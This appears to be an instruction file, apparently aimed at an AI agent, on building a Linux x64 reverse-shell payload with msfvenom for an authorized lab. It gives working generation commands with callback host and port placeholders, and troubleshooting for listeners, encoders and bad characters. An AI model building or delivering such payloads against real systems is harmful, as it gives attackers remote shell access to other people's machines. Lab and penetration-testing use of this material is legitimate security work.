# Choose the artifact's execution contract

Read this entire file before acting. Select the payload and inspect its required options before generating bytes. Finish with the payload identity, supplied options, format and saved artifact; generation does not establish delivery, execution or a session.

~~~bash
msfvenom --list payloads
msfvenom --list formats
msfvenom -p linux/x64/shell_reverse_tcp --list-options
~~~

The last command is an example of option inspection; choose a payload matching the authorized task. An ELF executable, raw shellcode, a script and a language-formatted byte array require different consumers. Renaming the output does not convert it. Inspect architecture and platform from the payload metadata rather than trying random output extensions.

For a selected lab reverse-shell artifact, define `callback_host` as the address reachable from that lab process, `callback_port` as its assigned listener port and `artifact` as a fresh private output path:

~~~bash
umask 077
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST="$callback_host" LPORT="$callback_port" -f elf -o "$artifact"
file "$artifact"
sha256sum "$artifact"
~~~

This creates a payload file; the inspection commands do not execute it. Match the receiving handler's exact payload/transport. A staged payload expects a compatible stage exchange, whereas a single-stage payload already carries its implementation. A callback to localhost refers to the machine executing the payload, not automatically the worker.

| Problem | Resolve before regenerating |
|---|---|
| Missing required option | Read `--list-options` for that exact payload, including advanced requirements. |
| Wrong format or loader error | Check whether the consumer expects executable, raw bytes or script text and its architecture. |
| Output exceeds a buffer | Measure the final encoded artifact and the consumer's byte budget; do not equate source-string length with raw payload length. |
| No session | Distinguish execution, egress, listener reachability and transport/stage mismatch. Generation success proves none of these. |

`-b` constrains bad characters for a particular byte consumer and `-e` selects an encoder when supported. Encoders are not a general antivirus-evasion guarantee, and encoding cannot repair a wrong architecture or unsupported payload. Preserve exact bytes through transfer; newline, Unicode and form encoding can corrupt a working local artifact. Do not add executable templates or external encoders without understanding their separate inputs/effects.

See [msfvenom usage](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) and [CLI options](https://github.com/rapid7/metasploit-framework/blob/master/msfvenom).
